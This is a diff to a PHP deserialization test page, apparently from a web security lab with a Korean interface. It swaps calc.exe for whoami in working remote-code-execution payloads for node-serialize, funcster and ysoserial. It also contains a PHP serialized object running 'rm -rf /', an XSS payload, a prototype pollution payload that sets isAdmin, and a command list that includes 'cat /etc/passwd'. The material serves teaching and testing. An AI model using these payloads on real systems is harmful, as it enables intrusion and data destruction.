@@ -321,7 +321,7 @@ class AdvancedDeserializationTest {
                     case 'type_confusion':
                         $result .= "ysoserial.exe -g TypeConfuseDelegate \\\n";
                         $result .= "  -f BinaryFormatter \\\n";
-                        $result .= "  -c \"calc.exe\" \\\n";
+                        $result .= "  -c \"whoami\" \\\n";
                         $result .= "  -o base64";
                         break;
                     case 'xml_serializer':
@@ -459,7 +459,7 @@ class AdvancedDeserializationTest {
                         $result .= "  'rce': {\n";
                         $result .= "    '__proto__': {\n";
                         $result .= "      'type': 'constructor',\n";
-                        $result .= "      'func': 'function(){ require(\"child_process\").exec(\"calc.exe\"); }()'\n";
+                        $result .= "      'func': 'function(){ return require(\"child_process\").execSync(\"whoami\").toString(); }()'\n";
                         $result .= "    }\n";
                         $result .= "  }\n";
                         $result .= "};\n\n";
@@ -600,7 +600,7 @@ class AdvancedDeserializationTest {
             switch ($payload_type) {
                 case 'node_serialize':
                     $endpoint = 'node_serialize';
-                    $payload = $custom_payload ?: '{"username":"admin","rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc.exe\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+                    $payload = $custom_payload ?: '{"username":"admin","rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
                     $post_data = [
                         'payload' => $payload
                     ];
@@ -619,7 +619,7 @@ class AdvancedDeserializationTest {
                     
                 case 'funcster':
                     $endpoint = 'funcster';
-                    $function_code = $custom_payload ?: 'function() { return require("child_process").execSync("whoami").toString(); }';
+                    $function_code = $custom_payload ?: 'function() { return require("child_process").execSync("pwd && whoami && ls -la").toString(); }';
                     $post_data = [
                         'functionCode' => $function_code
                     ];
@@ -1298,16 +1298,23 @@ O:11:"SystemShell":2:{s:3:"cmd";s:8:"rm -rf /";s:6:"target";s:4:"root";}
                     <div id="nodejs-payload-examples">
                         <div class="payload-examples">
 node-serialize RCE:
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('calc.exe');}()"}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()"}
 
 serialize-javascript XSS:
 {"name":"&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;","data":"malicious"}
 
 funcster RCE:
-function() { require("child_process").exec("whoami"); }
+function() { return require("child_process").execSync("whoami").toString(); }
 
 cryo Prototype Pollution:
 {"__proto__":{"polluted":"yes","isAdmin":true},"normalData":"hello"}
+
+🔍 유용한 명령어 예시:
+- whoami (현재 사용자)
+- pwd (현재 디렉토리) 
+- ls -la (파일 목록)
+- cat /etc/passwd (시스템 정보)
+- ps aux (실행 프로세스)
                         </div>
                     </div>
                 </div>
@@ -1332,7 +1339,7 @@ cryo Prototype Pollution:
                     
                     <div class="form-group">
                         <label for="command">실행할 명령어:</label>
-                        <input type="text" name="command" id="command" value="whoami" placeholder="예: whoami, ls -la, calc.exe">
+                        <input type="text" name="command" id="command" value="whoami" placeholder="예: whoami, ls -la, whoami">
                     </div>
                     
                     <div class="form-group">
@@ -1397,9 +1404,9 @@ cryo Prototype Pollution:
             const select = document.getElementById('nodejs_type');
             const textarea = document.getElementById('nodejs_payload');
             const examples = {
-                'node_serialize': '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc.exe\');}()"}',
+                'node_serialize': '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\');}()"}',
                 'serialize_javascript': '{"name":"[XSS Script Tag]","data":"malicious content"}',
-                'funcster': 'function() { require("child_process").exec("whoami"); }',
+                'funcster': 'function() { return require("child_process").execSync("whoami").toString(); }',
                 'cryo': '{"__proto__":{"polluted":"yes","isAdmin":true,"compromised":"WebSec-Lab"},"normalData":"hello"}'
             };
             
